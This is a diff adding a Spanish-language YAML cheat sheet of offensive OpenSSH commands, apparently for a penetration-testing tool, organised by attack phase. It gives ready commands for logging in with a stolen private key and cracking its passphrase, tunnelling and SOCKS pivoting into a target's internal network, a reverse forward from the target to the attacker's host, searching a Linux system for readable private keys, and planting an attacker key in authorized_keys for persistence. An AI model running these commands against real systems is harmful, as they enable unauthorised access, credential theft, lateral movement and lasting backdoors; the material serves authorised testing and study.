@@ -1,0 +1,71 @@
+# Comandos de OpenSSH: entrar con claves, túneles y persistencia.
+tool: ssh
+area: pivoting
+url: https://man.openbsd.org/ssh
+commands:
+  - id: ssh-key-login
+    title: Entrar con una clave privada encontrada
+    cmd: |
+      chmod 600 id_rsa && ssh -i id_rsa {{USER}}@{{RHOST}}
+    phase: initial-access
+    tags: [ssh]
+    notes: >-
+      ssh rechaza claves con permisos abiertos, de ahí el chmod. Si pide passphrase, la clave está
+      cifrada: se crackea con ssh2john y john. El usuario suele estar en el comentario del .pub.
+    refs: [https://man.openbsd.org/ssh]
+
+  - id: ssh-local-forward
+    title: Traer un puerto interno del objetivo a tu máquina
+    cmd: |
+      ssh -N -L 8080:127.0.0.1:80 {{USER}}@{{RHOST}}
+    phase: lateral
+    tags: [ssh, port-forwarding]
+    notes: >-
+      Lo que escuche en el 80 del objetivo solo para localhost (un panel, una base de datos) queda en
+      tu 127.0.0.1:8080. Cambia 127.0.0.1 por otra IP para llegar a un host que solo ve el objetivo.
+    refs: [https://man.openbsd.org/ssh#L]
+
+  - id: ssh-dynamic-socks
+    title: Proxy SOCKS a través del objetivo
+    cmd: |
+      ssh -N -D 1080 {{USER}}@{{RHOST}}
+    phase: lateral
+    tags: [ssh, socks, proxychains]
+    notes: >-
+      Abre un SOCKS en tu 1080 que sale por el objetivo: con proxychains (socks5 127.0.0.1 1080)
+      llegas a toda su red interna. Por SOCKS solo pasa TCP: nmap con -sT -Pn.
+    refs: [https://man.openbsd.org/ssh#D]
+
+  - id: ssh-remote-forward
+    title: Sacar un puerto del objetivo hacia tu máquina
+    cmd: |
+      ssh -N -R 3306:127.0.0.1:3306 kali@{{LHOST}}
+    phase: lateral
+    tags: [ssh, port-forwarding]
+    notes: >-
+      Se lanza desde el objetivo cuando no puedes entrar por SSH pero él sí puede salir hacia ti.
+      Usa un usuario de tu máquina sin privilegios y sin shell, solo para túneles.
+    refs: [https://man.openbsd.org/ssh#R]
+
+  - id: ssh-find-keys
+    title: Claves SSH y authorized_keys en un Linux
+    cmd: |
+      find / \( -name 'id_rsa*' -o -name 'id_ed25519*' -o -name 'id_ecdsa*' -o -name authorized_keys \) -readable 2>/dev/null
+    phase: credential-access
+    area: privesc-linux
+    tags: [ssh, file-search]
+    notes: >-
+      Una clave privada legible de otro usuario es un salto directo a su cuenta, en este equipo o en
+      los que aparezcan en su known_hosts. Mira también las copias de seguridad (/opt, /var/backups).
+    refs: [https://man.openbsd.org/ssh-keygen]
+
+  - id: ssh-authorized-keys
+    title: Persistencia con tu clave en authorized_keys
+    cmd: |
+      mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAA...tu-clave p3i' >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
+    phase: persistence
+    tags: [ssh, persistence]
+    notes: >-
+      Genera antes tu par con ssh-keygen -t ed25519 -f p3i y pega aquí el contenido de p3i.pub.
+      Sobrevive a cambios de contraseña. En un pentest real, apúntalo y bórralo al terminar.
+    refs: [https://man.openbsd.org/sshd#AUTHORIZED_KEYS_FILE_FORMAT]
